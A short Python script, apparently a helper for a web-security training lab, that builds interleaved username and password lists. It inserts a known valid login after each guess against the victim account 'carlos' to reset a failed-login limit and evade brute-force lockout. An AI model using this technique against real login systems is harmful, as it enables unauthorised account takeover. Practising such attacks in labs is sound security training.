# Valid credentials: wiener:peter
# Victim's username: carlos

validUserName = "wiener"
validUserPassword = "peter"

victmUserName = "carlos"
AccountLimit = 2

passwordWordlistPath = "./password.txt"

outputPasswordListFilePath = "./newPassword.txt"
outputUserListFilePath= "./newUser.txt"

# Generate Password List
# Each valid login allow us to reset login limits
def GeneratePasswordList(validUserPassword,passwordWordlistPath,outputPasswordListFilePath):
    with open(passwordWordlistPath,'r') as infile, open(outputPasswordListFilePath,'w') as outfile:
        lineCount = 0
        
        for index,line in enumerate(infile):
            removeNewline = line.strip()
            outfile.write(removeNewline + "\n")
            lineCount += 1

            #Valid Login - > Reset Login Limit
            if (index % (AccountLimit - 1) == 0):
                # print("index", index, "password", line.strip()) 
                outfile.write( validUserPassword + "\n")
             
        
        return lineCount
        
# GeneratePasswordList(validUserPassword,passwordWordlistPath,outputPasswordListFilePath)

# Generate Userlist 
def GenerateUserList(validUserName,victmUserName,PasswordlistNumbs, outputUserListFilePath):
    with open(outputUserListFilePath, 'w') as outputFile:
        
        for index in range(PasswordlistNumbs):
            outputFile.write(victmUserName + "\n")
                
            if (index % (AccountLimit - 1) == 0):
                outputFile.write(validUserName + "\n")

GenerateUserList(validUserName, victmUserName, GeneratePasswordList(validUserPassword, passwordWordlistPath, outputPasswordListFilePath), outputUserListFilePath)
#Notice -> Threading = 1 